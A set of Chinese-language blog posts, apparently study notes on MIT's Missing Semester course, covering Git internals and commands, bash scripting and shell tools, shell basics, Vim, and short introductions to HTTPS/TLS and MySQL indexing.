数据模型，意味着理解 tree、blob、commit。在 Git 数据模型 中，我们将文件称为 blob，目录则称为 tree。显然，tree 可以同时包含 tree 和 blob，而 blob 并不能。还有一个我们不能忽视的角色是快照，它们被称为 commit，每个 commit 都包含以下内容： parent author message snapshot 这里指代最顶层 tree 的快照 Object 如果用伪代码表述的话，可以表示上述三者为： 12345678910111213// a file is a bunch of bytestype blob = array&lt;byte&gt;// a directory contains named files and directoriestype tree = map&lt;string, tree | blob&gt;// a commit has parents, metadata, and the top-level treetype commit = struct { parents: array&lt;commit&gt; author: string message: string snapshot: tree} 我们用 object 去统称 tree、blob、commit，则所有 object 都可以按如下方式统一管理： 12345678910type object = blob | tree | commitobjects = map&lt;string, object&gt;def store(object): id = sha1(object) objects[id] = objectdef load(id): return objects[id] 简而言之，Git 会对 object 通过 SHA-1 哈希值 （40 个 16 进制数）进行内容寻址。 Reference 尽管所有的 commit 都被哈希值唯一标记，但正常人类是没办法记住 40 个 16 进制数的，因此我们需要借助索引去记忆，它们指向实际的 commits，比如我们常用索引 master 就指向主分支上的最新的 commits。 12345678910111213references = map&lt;string, string&gt;def update_reference(name, id): references[name] = iddef read_reference(name): return references[name]def load_reference(name_or_id): if name_or_id in references: return load(references[name_or_id]) else: return load(name_or_id) 在 Git 中，索引 HEAD 指向当前位置。 Snapshots 每个 commit 都会记录最顶层 tree，形如： 1234567&lt;root&gt; (tree)|+- foo (tree)| || + bar.txt (blob, contents = &quot;hello world&quot;)|+- baz.txt (blob, contents = &quot;git is wonderful&quot;) 而 commits 的 DAG （有向无环图）则构成了 Git 的历史记录，通俗来讲就是，每个 commit 只需要知道自己的父亲是哪些 commits，也就是能正确回答我从哪里来这个问题就好（嗯~ 非哲学范畴）。 假如考虑这样一个场景，我们要对源码进行 1. 修复 Bug；2. 添加新功能，我们可以用新建两个分支同步执行： 1234o &lt;-- o &lt;-- o &lt;-- o ^ \\ --- o &lt;-- o 我们接下来需要合并 1 和 2，但不可避免的会遇到合并冲突，这需要我们手动选择保留和删除冲突代码。 1234o &lt;-- o &lt;-- o &lt;-- o &lt;---- o ^ / \\ v --- o &lt;-- o Repositories 现在，我们终于能够正确定义一个 Git 仓库了！在硬盘上，它是一堆由 reference 和 object 构成的数据，我们可以从 Git 数据模型 角度去理解。我们输入的 Git 命令 都在操作 commit 的 DAG，本质上是在添加和修改 object 和 referance。 暂存区 Git 还有一个暂存区的概念，它跟数据模型正交，属于创建提交的一部分。简单来说，暂存区允许我们告诉 Git 下一次快照需要包含哪些修改，这和通常的 VCS 直接保存当前状态有所区别，这能够暂存区的快照更干净、更聪明。 另外，如果你创建了一个新文件，Git 并不会跟踪它，此时它的状态是 Untracked files，除非你用 git add 命令将其加入 暂存区。 一个高质量的提交消息很重要，可参考 A Note About Git Commit Messages How to Write a Git Commit Message Git 命令行接口 可以阅读 Pro Git 以了解更多细节。 基础 git help &lt;command&gt; 帮助文档 git init 将当前文件夹初始化为一个 git 仓库，并将数据都放到 .git 文件夹 中 git status 查看当前状态 git add &lt;filename&gt; 添加文档到暂存区 git commit 创建一个 commit git log 展开历史日志 git log --all --graph --decorate 以 DAG 方式展开历史日志 git diff &lt;filename&gt; 展示 暂存区 中该文件的具体变动 git diff &lt;revision&gt; &lt;filename&gt; 展示不同快照间该文件的变动 git checkout &lt;revision&gt; 更新 HEAD 索引 到指定快照 分支与合并 git branch 展示分支 git branch &lt;name&gt; 创建分支 git checkout -b &lt;name&gt; 创建分支并切换 HEAD 到该分支 等效于 git branch &lt;name&gt;; git checkout &lt;name&gt; git merge &lt;revision&gt; 将指定分支合并到当前分支 git mergetool 一个工具，用来解决合并冲突的 git rebase 变基 TODO 远程访问 git remote 展示远程仓库 git remote add &lt;name&gt; &lt;url&gt; 将一个远程仓库添加到当前 Git 仓库 git push &lt;remote&gt; &lt;local branch&gt;:&lt;remote branch&gt; 发送 objects 到远程仓库，并更新远程仓库 reference git branch --set-upstream-to=&lt;remote&gt;/&lt;remote branch&gt; 设置本地分支和远程分支的联系关系 git fetch 从远程仓库获取 objects/references git clone 将远程仓库下载到本地 撤销 git commit --amend 修改一条 commit 的内容或者捎带信息 git reset HEAD &lt;file&gt; 取消暂存文件 git checkout -- &lt;file&gt; 丢弃改变 Git 高级命令 git config 可以参考 git-config git clone --depth=1 浅克隆，丢掉完整的历史，只保留一个快照 git add -p git rebase -i git blame 查看谁最后编辑的 git stash git bisect .gitignore 指定哪些 untracked files 需要忽略 Fast-Forward Merge **Fast-Forward Merge（快进式合并）** 其实并不需要我们做额外操作，它是 Git 本身内置的。 Three-Way Merge 如果在合并时使用 --no-ff 参数，Git 就会采用 Three-Way Merge（三方合并）。所谓三方合并是同 “先 diff，再手工决定” 的两方合并相区别的，它会根据原始文档内容判断到底该保留谁的，简单来说是舍旧迎新策略。 Squash Merge **Squash Merge（压缩式合并）** 本身和普通 merge 没什么两样，但是它能让整个 log 更加干净。我们正常合并会让新 commit 拥有两个父节点，但很多时候我们的分支只是做了一些很细小的修改，如果直接 merge 会让整个 log 看着非常乱，而压缩式合并能够解决我们这种需求。当然，它是原理本身不难猜到，就是将分支改动在主干上重放，然后需要手动 commit。 Rebase TODO cherry-pick TODO Resources Pro Git 很重要的一本书 Oh Shit, Git!?! 教你如何处理常见 Git 错误 Git for Computer Scientists Git from the Bottom Up 详细描述 Git 自底向上实现 How to explain git in simple words? Learn Git Branching Git 教学游戏 实践 1 本地操作 添加一个 animal.py 12345678910import sysdef default(): print('hello')def main(): default()if __name__ == '__main__': main() 加入到暂存区 git add animal.py 提交 git commit 查看 添加猫猫功能 添加狗狗功能 合并分支 代码冲突解决后记得将冲突文件添加到暂存区，最后键入 git merge --continue，解决！ 实践 2 远程访问 绑定远程项目 将本地 git 项目和远程项目绑定，如果是从远端拷贝到本地，那直接克隆就好。但若是先建立的本地项目，想要发送到远程，则需要配置 remote，再 push。 同步更新 你在修改代码的同时，别人也在修改代码，因次我们除了保持本地与远程同名分支代码的同步外，想要合并到主干分支，务必请求 pull request 简称 PR。 上传到远端分支 Bob 后，我们可以提交 PR，然后仓库管理员会审核，如果有冲突的代码会手动解决冲突。 参考 【1】Git 合并那些事 —— 认识几种 Merge 方法","link":"/2023/04/18/mit-6_null-git/"},{"title":"MIT 6.Null Shell 脚本编程和常用工具","text":"本文主要叙述了如何以脚本方式去使用 bash，并介绍了大量常用的 Shell 工具。很多工具并非系统自带，需要手动下载甚至手动配置，如果是 Mac OS 的话，使用 brew 一键安装即可。 shell 脚本 大部分 Shell 都有自己的脚本语言，我们掌握最基本的 bash 脚本就能应付绝大多数使用场景。为什么需要学习 Shell 脚本，因为在使用 Shell 时，除了执行命令和用管道将它们连接外，常常会有 批量执行命令 和 控制流 的需求。控制流本身指程序运行顺序，程序员可以通过循环和条件语句去控制这个顺序。 12345678~/tmp$ ls~/tmp$ foo=bar~/tmp$ foo = barzsh: command not found: foo~/tmp$ echo &quot;$foo&quot;bar~/tmp$ echo '$foo'$foo 赋值变量 我们可以在 bash 中直接赋值变量，但注意在 shell 脚本中，空格符会将参数拆分。另外，字符串可以用单引号' 和双引号 &quot; 定义，但二者不等效。单引号是纯文本，双引号会替换变量值。 现在我们写一个脚本文件 mcd.sh，$1 表示这个脚本接收的第一个参数： 1234mcd() { mkdir -p &quot;$1&quot; cd &quot;$1&quot;} bash 会使用特殊变量来引用参数、错误代码和其他变量，下面列出了常用变量： $0 - 脚本名 $1 到 $9 - 脚本接收的参数 $@ - 脚本接收的全部参数 $# - 参数数目 $? - 上一条命令的返回码 $$ - 处理当前脚本的进程 id !! - 完整的上一条命令包括参数 $_ - 上一条命令的最后一个参数 想更多细节，请参考 TLDR (Linux 文档计划）的 特殊变量章节。 命令返回结果 命令会使用 STDOUT 返回输出或者用 STDERR 返回错误，并且会返回一个 Return Code（也就是 $?）。这个返回码为 0 时表示一切正常，反之如果出错则返回码为 1。返回码能够与逻辑与 &amp;&amp; 和逻辑或 || 一起组合运算，还可以用分号; 将同一行命令分隔。 12345678910~/tmp$ false || echo &quot;Oops, fail&quot;Oops, fail~/tmp$ true || echo &quot;Will not be printed&quot;~/tmp$ true &amp;&amp; echo &quot;Things went well&quot;Things went well~/tmp$ false &amp;&amp; echo &quot;Will not be printed&quot;~/tmp$ true ; echo &quot;This will always run&quot;This will always run~/tmp$ false ; echo &quot;This will always run&quot;This will always run 命令置换和进程替换 一种常见的场景是希望将命令的输出结果作为变量获取，我们可以通过 命令置换 command substitution 完成。当我们输入 $(CMD) 时，它会先执行 CMD，并用结果取代原本的 $(CMD)。比如，当我们想要遍历文件夹时，可以使用 for file in $(ls)，shell 会先调用 ls 然后迭代访问这些其返回结果。 另外一个鲜为人知的类似功能是 进程替换 process substitution，常用在希望将命令结果用文件而不是 STDIN 传递时。当我们输入 &lt;(CMD) 时，会先执行 CMD，然后将结果保存在一个临时文件中，并用这个临时文件名去替换原本的 &lt;(CMD)。比如，diff &lt;(ls foo) &lt;(ls bar) 会现实 foo 和 bar 两个文件夹之间的差异。 123456789101112131415#!/bin/bashecho &quot;Starting program at $(date)&quot; # Date will be substitutedecho &quot;Running program $0 with $# arguments with pid $$&quot;for file in &quot;$@&quot;; do grep foobar &quot;$file&quot; &gt; /dev/null 2&gt; /dev/null # When pattern is not found, grep has exit status 1 # We redirect STDOUT and STDERR to a null register since we do not care about them if [[ $? -ne 0 ]]; then echo &quot;File $file does not have any foobar, adding one&quot; echo &quot;# foobar&quot; &gt;&gt; &quot;$file&quot; fidone 代码中比较了前一条命令的返回码是否为 0，如果想要执行其他比较，可以参考 Linux 手册 和 Unix wiki，执行比较的时候注意加双中括号 [[]]。 通配符 Shell 支持 通配符 Wildcards，可以用? 和 * 分别匹配 一个 或 多个 字符，此外 Shell 还支持用大括号 {} 去扩展命令中的公共子字符串。 1234567891011121314~/tmp$ mkdir foo bar~/tmp$ mkdir {foo,bar}/{x..z}~/tmp$ tree ..├── bar│ ├── x│ ├── y│ └── z├── foo│ ├── x│ ├── y│ └── z├── mcd.sh└── test.sh 当脚本变得很复杂时，我们可以借助 shellcheck 检测 sh 和 bash 的语法错误。 其他脚本 除了 bash 脚本，我们还可以写一个 Python 脚本，它通过 python3 解释器而不是 bash 来执行。 1234#!/usr/bin/python3import sysfor arg in reversed(sys.argv[1:]): print(arg) 执行方法也是通用的： 12345~/tmp$ chmod 755 script.py~/tmp$ ./script.py a b ccba 第一行的#! 是 shebang，它会告诉内核使用 python3 解释器 来执行这个脚本。这里不得不强调一下脚本和 shell 函数 的区别，shell 函数必须用使用和当前 shell 相同的语言，而脚本可以用任何语言，这就是为什么脚本都需要加上一行 shebang。 shell 工具 查看命令使用方式 一般用 -h 或 --help，也可以用 man 直接查看使用手册，但有时候手册过于臃肿，我们可以借助工具 tldr 将说明简化。 查找文件 直接使用内置命令 find 即可： 12345678# Find all directories named srcfind . -name src -type d# Find all python files that have a folder named test in their pathfind . -path '*/test/*.py' -type f# Find all files modified in the last dayfind . -mtime -1# Find all zip files with size in range 500k to 10Mfind . -size +500k -size -10M -name '*.tar.gz' 我们还可对找到的文件执行操作： 1234# Delete all files with .tmp extensionfind . -name '*.tmp' -exec rm {} \\;# Find all PNG files and convert them to JPGfind . -name '*.png' -exec convert {} {}.jpg \\; 尽管 find 很强大，但它的语法用起来也很麻烦，因此我们通常用替代工具 fd，它更简单更快而且更友好： 12345~/tmp$ fd &quot;t&quot;bar/t/foo/t/script.pytest.sh 查找代码 查找代码最通用的自然是 grep，grep 有很多标志符，比较常用的是 -C 用来获取匹配行的上下文，以及 -v 用来反转匹配（比如返回所有不匹配某个 pattern 的行）。当你想要从多个文件中快速查找时，可以用 -R 递归查询。 针对 grep -R 也有很多优化查询工具，比如 ack, ag 和 rg，下面的结果高下立判。 1234567891011121314151617181920212223~/tmp$ grep -R &quot;s&quot; 17s./script.py:#!/usr/bin/python3./script.py:import sys./script.py:for arg in reversed(sys.argv[1:]):./test.sh:#!/bin/bash./test.sh:echo &quot;Starting program at $(date)&quot; # Date will be substituted./test.sh:echo &quot;Running program $0 with $# arguments with pid $$&quot;./test.sh: # When pattern is not found, grep has exit status 1./test.sh: # We redirect STDOUT and STDERR to a null register since we do not care about them./test.sh: echo &quot;File $file does not have any foobar, adding one&quot;~/tmp$ rg &quot;s&quot;test.sh1:#!/bin/bash3:echo &quot;Starting program at $(date)&quot; # Date will be substituted5:echo &quot;Running program $0 with $# arguments with pid $$&quot;9: # When pattern is not found, grep has exit status 110: # We redirect STDOUT and STDERR to a null register since we do not care about them12: echo &quot;File $file does not have any foobar, adding one&quot;script.py1:#!/usr/bin/python32:import sys3:for arg in reversed(sys.argv[1:]): 查找 shell 命令 通过 history 我们可以浏览之前输入的命令，除了不断按上箭头，我们还可以通过 history | grep find 找到包含 “find” 子串的命令。 此外，我们也可以用 Ctrl+R 去向后搜索，它其实是和 fzf 绑定的。当然，由于我用的是 zsh，自然使用 history-based autosuggestions 插件了。 练习 练习 1 读 man ls 并一个 ls 命令来列出所有文件 123456789~/tmp$ ls -ahlt --colortotal 24drwxr-xr-x+ 116 huangzining staff 3.6K 12 13 16:19 ..drwxr-xr-x 7 huangzining staff 224B 12 13 16:03 .drwxr-xr-x 28 huangzining staff 896B 12 13 15:46 bardrwxr-xr-x 28 huangzining staff 896B 12 13 15:46 foo-rwxr-xr-x 1 huangzining staff 80B 12 13 15:27 script.py-rw-r--r-- 1 huangzining staff 484B 12 13 15:11 test.sh-rw-r--r-- 1 huangzining staff 40B 12 12 22:46 mcd.sh 练习 2 编写一个 marco 保存当前目录路径，然后执行 polo 进入之前保存的路径 123456789101112~/tmp$ cat marco.shmarco() { target=~/tmp/test.txt if [[ ! (-e $target) ]]; then touch $target fi echo $(pwd) &gt; $target}~/tmp$ cat polo.shpolo() { cd $(cat ~/tmp/test.txt)} 注意修改执行权限并用 source 将这两个命令定义给 shell。 练习 3 捕获脚本的全部输出打印到文件，记录运行次数 123456789101112 #!/usr/bin/env bashfor (( i=1;; i++ )); do n=$(( RANDOM % 100 )) if [[ n -eq 42 ]]; then echo &quot;Something went wrong&quot; &gt;&amp;2 echo &quot;The error was using magic numbers&quot; echo &quot;run $i times&quot; exit 1 fi echo &quot;Everything went according to plan&quot; done","link":"/2022/12/12/mit-6_null-shell-tools-and-scripting/"},{"title":"MIT 6.Null 如何玩转Shell","text":"6.Null 是 MIT 专为介绍常用计算机工具所开设的一门课程。我在过去的工作和学习过程中可能已经接触过 git、vim 等工具，也会使用一些简单的命令行指令比如 cd、cp、mv 等，但远远谈不上熟练。 我仍然记得当我第一次怀着热情学习 Linux 时，首先上知乎，在大神们的指路下捧起了 鸟叔的 Linux 私房菜 这本书。结果我翻了不到两三页就开始犯困，学习热情消退地很快，整个人就像一个正通过新华字典学语文的洋人。更难以接受的是，网友们评价这本书学起来比较轻松，真的很难想象上古程序员们是度过了怎样枯燥的学习生涯。总而言之，这门课的定位就是一名合格的计算机领路人，我们不用再对着手册慢慢啃，或者干脆永远像新手一样用时谷歌，对着博客里的命令行代码一通照搬生抄，对于 shell 指令 的概念也仅仅停留在这一长串命令是用来干这个或那个的阶段。 初识 课程使用 Bourne Again SHell 或者说 bash，但我更喜欢在 Mac 上用 Zsh（一种拓展 bash），我使用的终端程序是 iTerm2。如果有美化需求，可以结合调色卡和 zsh 主题自定义。当然如果使用 Windows 11，我发现 PowerShell(v7.4.0) 的优化和配置也挺不错的。 123456~$ date2022年12月12日 星期一 14时48分25秒 CST~$ echo hello\\ worldhello world~$ echo &quot;hello world&quot;hello world ～ 是 /Users/your-name 的缩写，date 和 echo 都是程序，我们可以通过 \\ 输入转义字符或者直接用字符串，这些小程序就是我们常说的命令。当我们输入一个命令时，Shell 会到 $PATH 中定义的目录里查找与之匹配的程序并执行。 12345678~$ echo $PATH...:...:...:dir-x:dir-y:...:...~$ which echoecho: shell built-in command~$ which date/bin/date~$ /bin/date2022年12月12日 星期一 15时14分09秒 CST 路径 Linux 和 macOS 用 / 分隔路径并以 / 为根路径，Windows 上用 \\ 分隔且每个磁盘都有一个根，说实话后者的反斜杠真的反人类，后文默认采用 Linux 文件系统。任何以 / 开头的都是 绝对路径，其他都是 相对路径，相对是指相对于当前工作目录。我们用 pwd（print work directory）命令可以打印当前目录的绝对路径，而用 cd（change directory）可以进入其他目录，另外 .. 表示父目录。 1234567~$ pwd/Users/huangzining~$ cd /home/home$ pwd/home/home$ cd ../$ 当我们运行一个程序时，默认在当前目录中运行，比如 ls 指令默认打印当前目录的内容也可以打印你给出的指定目录。命令运行接收带 - 开头的标志来控制修改其行为，比如 -h 或者 –help 可以打印程序的帮助文本，阅读帮助文本我们可以知道 ls -l 表示打印长文本信息。 12345~$ ls -l gototal 0drwxr-xr-x 10 huangzining staff 320 8 10 22:08 bindrwxr-xr-x 5 huangzining staff 160 9 19 22:14 pkgdrwxr-xr-x 3 huangzining staff 96 8 9 22:26 src d 告诉我们这是一个目录文件，后面跟着三组形如 rwx 的字符，按照文件持有人、用户组和其他人拥有哪些权限。rwx 表示读写执行，短横线表示无对应权限，一般而言普通用户只能读和执行文件。 此外，我们常用的一些命令还包括 mv 文件移动（或重命名）、cp 文件复制和 mkdir 创建目录。想要了解一个命令程序的完整手册可以使用 man 命令查看，按 q 退出。 输入输出流 当我们输入 echo 命令打印 hello word 时，键盘就是输入，屏幕就是输出，但 shell 允许我们重定向输入输出流。最简单的重定向是 &lt; file 和 &gt; file，分别对应输入流和输出流的重定向，还可以组合使用。 123456789101112~/tmp$ echo hello &gt; hello.txt~/tmp$ cat hello.txthello~/tmp$ cat &lt; hello.txthello~/tmp$ cat &lt; hello.txt &gt; hello2.txt~/tmp$ cat hello2.txthello~/tmp$ cat &lt; hello.txt &gt;&gt; hello2.txt~/tmp$ cat hello2.txthellohello 上面的 &gt;&gt; 表示追加，而 &gt; 只能覆盖文件。当然，重定向输入输出流的核心是管道的使用，即利用 ｜ 将两个程序的输入输出连接起来。 12~$ ls -l go | tail -n1drwxr-xr-x 3 huangzining staff 96 8 9 22:26 src root 在大多数类 Unix 系统上，都有一个超级用户 root，它可以创建、读取、更新和删除系统中的任何文件。一般我们通过 sudo 命令执行一些只能 root 才能执行的事情，或者切换成 root 用户。 1234567~$ sudo xxx~$ suPassword:sh-3.2#sh-3.2# exitexit~$ 当出现#时，说明已进入 root 模式。 练习 1. 在 tmp 目录下创建一个 missing 目录: 123~/tmp$ mkdir missing~/tmp$ lsmissing 2. 利用 man 熟悉 touch 命令: 1~/tmp$ man touch 3. 使用 touch 在 missing 内部创建一个名为 semester 的文件: 123~/tmp$ touch missing/semester~/tmp$ ls missingsemester 4. 将一段内容写到 semester 文件中，每次写入一行： 1234~/tmp$ echo '#!/bin/bash' &gt; missing/semester~/tmp$ echo 'curl --head --silent https://missing.csail.mit.edu' &gt; missing/semester~/tmp$ cat missing/semestercurl --head --silent https://missing.csail.mit.edu 注意，! 比较特殊即使用双引号包裹也会被执行，因此在作为纯文本时要用单引号。 5. 直接执行文件: 1234~/tmp$ ./missing/semesterzsh: permission denied: ./missing/semester~/tmp$ ll missing/semester-rw-r--r-- 1 huangzining staff 51B 12 12 16:27 missing/semester 没有 x 权限，无法执行。 6. 利用 sh 执行文件: 12345678910111213141516171819202122~/tmp$ sh missing/semesterHTTP/2 200server: GitHub.comcontent-type: text/html; charset=utf-8last-modified: Mon, 05 Dec 2022 15:59:23 GMTaccess-control-allow-origin: *etag: &quot;638e155b-1f37&quot;expires: Sun, 11 Dec 2022 08:21:47 GMTcache-control: max-age=600x-proxy-cache: HITx-github-request-id: FEC6:5295:A4B3D:AE839:6395911Eaccept-ranges: bytesdate: Mon, 12 Dec 2022 08:30:02 GMTvia: 1.1 varnishage: 0x-served-by: cache-nrt-rjtf7700052-NRTx-cache: HITx-cache-hits: 1x-timer: S1670833802.399771,VS0,VE225vary: Accept-Encodingx-fastly-request-id: facf3a37ed8fe85eaa8ea754c22f5687009da86bcontent-length: 7991 7. 学习 chmod 8. 修改文件权限: 12345678910111213141516171819202122232425~/tmp$ chmod 755 missing/semester~/tmp$ ll missing/semester-rwxr-xr-x 1 huangzining staff 51B 12 12 16:27 missing/semester~/tmp$ ./missing/semesterHTTP/2 200server: GitHub.comcontent-type: text/html; charset=utf-8last-modified: Mon, 05 Dec 2022 15:59:23 GMTaccess-control-allow-origin: *etag: &quot;638e155b-1f37&quot;expires: Mon, 12 Dec 2022 06:15:51 GMTcache-control: max-age=600x-proxy-cache: MISSx-github-request-id: FA3C:15BE:D7417:13394F:6396C4BEaccept-ranges: bytesdate: Mon, 12 Dec 2022 08:37:00 GMTvia: 1.1 varnishage: 0x-served-by: cache-tyo11980-TYOx-cache: HITx-cache-hits: 1x-timer: S1670834221.770088,VS0,VE165vary: Accept-Encodingx-fastly-request-id: d62b90ed680dd96c4821069bb3648d618c7a597bcontent-length: 7991 通过查阅 shebang，我们知道 #! 实际上指代了 #!interpreter [optional-arg]，常见的如： #!/bin/sh #!/bin/bash #!/usr/bin/pwsh #!/usr/bin/env python3 #!/bin/false 9. 利用 | 和 &gt; 将由 semester 生成的 last modified 字段内容输出到 home/last-modified.txt 中: 123~/tmp$ ./missing/semester|grep last-modified|cut -d ':' -f 2 &gt; ~/last-modified.txt~/tmp$ cat ~/last-modified.txt Mon, 05 Dec 2022 15","link":"/2022/12/12/mit-6_null-shell/"},{"title":"MIT 6.Null Vim","text":"据 Stack Overflow 2022 年统计，Visual Studio Code 是全平台最流行的编辑器，而 Vim 则是最流行的命令行文本编辑器。Vim 源于 1976 年的 Vi 编辑器，许多工具都支持 Vim 仿真模式（比如 Visual Studio Code），如果点进 Vim 官网，你会看到一个巨古老的界面，硬核气息可谓是扑面而来。 后人竟是我自己：“写的不够好，vim 哲学没有好好描述，基本命令释义应该用中文，多一点实践场景，那种囊括大部分操作的 demo 展示，以后再修改” 入门 初学者可以用 Vim 自带的一个教学文档 vimtutor，它会让你动手实践来学习。Vim 的配置文件是 .vimrc。 Vim 哲学 Vim 的终极目标是：所思即所得，让编辑速度和思考速度匹配。而为了达成这个目标，Vim 支持 模态编程 和 命令组合。 模态编程 由于我们在编程的时候，很少编辑长文本，反而常常将时间花在搜索、阅读和小规模的编辑上，为此 Vim 设计了多种运行模式。在不同的场景下进入不同的运行模式，从而保持心流。 Normal Insert Replace Visual Command-line Vim 默认和初始状态都是 Normal，我们可以通过 &lt;ESC&gt; 从任何模式切换回 Normal。在普通模式下，我们可以按 i 进入 Insert，也可以按 r 进入 Replace，使用 v 进入 Visual-plain，使用 v 进入 Visual-line，使用 &lt;Ctrl-V&gt; 进入 Visual-block，使用 : 进入 Command-line。当然，我们最常用的还是 Normal 和 Insert 模式。 基本命令 移动 Basic movement: hjkl (left, down, up, right) Words: w (next word), b (beginning of word), e (end of word) Lines: 0 (beginning of line), ^ (first non-blank character), $ (end of line) Screen: H (top of screen), M (middle of screen), L (bottom of screen) Scroll: &lt;Ctrl u&gt; (page up), &lt;Ctrl d&gt; (page down) File: gg (beginning of file), G (end of file) Line numbers: number G (number line) Misc: % (corresponding item) Find: f{character}, t{character}, F{character}, T{character} Search: /{regex}, n or N for navigating matches 选取 v 普通选取 V 按行选取 &lt;Ctrl v&gt; 按块选取 编辑 i 进入 Insert 模式 o 或 O 在下一行或上一行插入空白行 d{motion} 删除 e.g. dw 删除单词，d$ 删除至行尾，d0 删除至行头 c{motion} 修改 x 删除当前字符，和 dl 等效 s 修改当前字符，和 cl 等效 u 撤销 &lt;Ctrl r&gt; 返回撤销 y 复制（yank 缩写） p 粘贴 计数 我们可以将名词或动词同数字组成，从而简化重复操作 3w 向前移动三个单词 5j 向下移动五行 7dw 删除七个单词 修饰符 我们对于成对的修饰符可以用 a 或 i 去操作其包含的内容： ci( 修改 () 内的内容 ci[ 修改 [] 内的内容 da' 删除'' 内的内容以及'' 本身 Command-line 命令 :q quit :w save :wq save and quit :e {name of file} open file for editing :ls show open buffers :help {topic} open help 高级 Vim 查询和替换 Vim 本身有用:s 提供查询替换功能，但是具体怎么用可以看 vim fandom，这边提供几个使用例子。 %s/foo/bar/g 用 foo 去全局替换 bar %s/\\[.*\\](\\(.*\\))/\\1/g 将 markdown 链接替换成普通 url","link":"/2022/12/16/mit-6_null-vim/"},{"title":"计算机网络 HTTPS","text":"HTTPS 主要解决了 HTTP 的两个问题，第一是不再明文传输避免传输的内容被偷窥，第二个是提高了通信传输的安全性防止内容被篡改。 HTTPS 本质是在 HTTP 上套一层 SSL/TLS，底层依然是 TCP。HTTP 使用 TCP 现在默认长链接了，英文 “Keep-Alive”，在获取网页源码后，对于 JS、CSS、图片文件不再另外单独挨个发起 TCP 连接，而是保持原本 TCP 连接不变，继续请求这些文件资源。 HTTP 原本是基于 TCP/IP 的，现在 HTTPS 在其基础之上加上了 SSL/TLS。 SSL 的密钥协商 一般基于 RSA 的密钥通信流程是： 客户端发起请求 服务端返回 CA 证书 客户端验证证书 客户端从证书中取得公钥 客户端生成一个密钥 k，用公钥加密成 k' 后发送给服务端 服务端用密钥解密密钥 k'，得到 k 二者都用该秘钥进行通信 上面这套流程有两个作用，其一是 防止窥探，无论是截取 k' 还是截取公钥，都无法得到私钥和接下来进行通信的密钥 k；其二是 防止篡改，无论是伪造证书或者伪造 k' 都会被验证失败。 SSL/TLS SSL 升级之后就成了 TLS，核心我们只需要记住两点：非对称加密和对称加密的混合加密以及数字证书和 CA。 对称加密和非对称加密 对称加密时，加密和解密都适用相同的秘钥，比如我们给压缩包上密码，别人用你设置的密码解压得到里面的内容； 非对称加密时，公钥和私钥分别用来解密对方加密的内容。 摘要算法 摘要算法主要是用在校验完整性上，我们将要传输的内容通过哈希算法，可以得到一个固定长度的摘要。这样，如果中途有黑客破坏了内容完整性，就会导致接受时发现用相同哈希函数计算内容和摘要不一样。 数字证书和 CA 为了保证客户端拿到手的公钥是服务端的而不是黑客的，我们还需要数字证书和 CA 去验证身份。 参考 【 1 】 扫盲 HTTPS 和 SSL/TLS 协议","link":"/2023/03/27/network-https/"},{"title":"MySQL 扫盲","text":"MySQL 是一个 GPL 开源的 DBMS （关系数据库管理系统），根据 DB-Engines，截止 2023 年它的流行程度已仅次于 Oracle。其实有很多其他比 MySQL 好用的 DBMS，但为什么它能如此受欢迎呢，个人认为主要有三点：开源免费、简单易用、知名度高。 后人竟是我自己：“写完再看，感觉好枯燥，好丑，逻辑不清晰，语言不练达，你真的懂 MySQL 吗？？” 如何选择开源许可证？ 索引 首先我们应当明确一点，索引是用来 优化 SQL 查询 的，或者说提高 SELECT 操作速度的，当然前提是要在查询条件中使用索引列。 创建索引 由 CREATE INDEX Statement， 1234567891011121314151617181920212223242526CREATE [UNIQUE | FULLTEXT | SPATIAL] INDEX index_name [index_type] ON tbl_name (key_part,...) [index_option] [algorithm_option | lock_option] ...key_part: {col_name [(length)] | (expr)} [ASC | DESC]index_option: { KEY_BLOCK_SIZE [=] value | index_type | WITH PARSER parser_name | COMMENT 'string' | {VISIBLE | INVISIBLE} | ENGINE_ATTRIBUTE [=] 'string' | SECONDARY_ENGINE_ATTRIBUTE [=] 'string'}index_type: USING {BTREE | HASH}algorithm_option: ALGORITHM [=] {DEFAULT | INPLACE | COPY}lock_option: LOCK [=] {DEFAULT | NONE | SHARED | EXCLUSIVE} 前缀索引 有时候索引列很长比如 CHAR(200)，但在前 10 个或者前 20 个字符，大多数值又是唯一的，我们可以对索引列的前 N 个字符创建索引，从而节省索引空间并加速查询。 全文本索引 MyISAM 和 InnoDB 存储引擎都支持全文本索引 FULLTEXT 的，并且只限于 CHAR、VARCHAR 和 TEXT 列，但是索引是对整个列的，不支持前缀索引。 索引设计原则 这里我直接引用 《深入浅出 MySQL》， 最适合索引的列是出现在 WHERE 子句中的列，或连接子句中指定的列，而不是出现在 SELECT 关键字后的选择列表中的列。 … 如果有一个 CHAR (200) 列，如果在前 10 个或 20 个字符内，多数值是惟一 的，那么就不要对整个列进行索引。对前 10 个或 20 个字符进行索引能够节省大量索引空间， 也可能会使查询更快。 … 利用最左前缀。 … 如果有明确定义的主 键，则按照主键顺序保存。如果没有主键，但是有唯一索引，那么就是按照唯一索引的顺序 保存。如果既没有主键又没有唯一索引，那么表中会自动生成一个内部列，按照这个列的顺 序保存。 索引结构 MySQL 有两种索引结构，B-TREE 和 HASH，MyISAM 和 InnoDB 都只支持 B-TREE，而 MEMORY/HEAP 支持 HASH 和 B-TREE。HASH 结构的数据库引擎有几个最显著的限制，只能在 WHERE 中使用 = 或 &lt;=&gt; 符，无法使用 ORDER BY，本质是为了换取更小内存做出的牺牲。 博客：B 树家族 组合索引的最左前缀特性 如果我们创建了一个组合索引，我们也不强求在条件句中用上全部的索引列，而是只要用到了最左边的索引列就能用上这个组合索引。 1234567891011121314151617mysql&gt; create index ind_sales2_companyid_moneys on sales2(company_id,moneys);Query OK, 1000 rows affected (0.03 sec)Records: 1000 Duplicates: 0 Warnings: 0mysql&gt; explain select * from sales2 where company_id = 2006\\G;*************************** 1. row *************************** id: 1 select_type: SIMPLE table: sales2 type: refpossible_keys: ind_sales2_companyid_moneyskey: ind_sales2_companyid_moneys key_len: 5 ref: const rows: 1 Extra: Using where1 row in set (0.00 sec) 索引的 like 查询 如果查询条件是 like，那么 % 不能放在开头，否则无法使用索引；对于大文本查询，我们要用全文搜索，而不是 like %…%。 无法使用索引的场景 MySQL 估计索引查询比全表扫描还要慢时 使用 MEMORY/HEAP，并且 where 条件中不带 = 时，因为 HASH 索引自身的结构原因不支持 采用复合索引时，WHERE 条件没有索引列的第一部分 用 or 分割开的 WHERE 条件句，如果有一个列没有索引，则都不会用到 如果 like 是用 % 开头的则不支持 事务和锁定语句 MySQL 事务 一般指的本地事务，但它也能通过 XA 事务支持分布式事务。 事务控制命令 12345678910111213START TRANSACTION 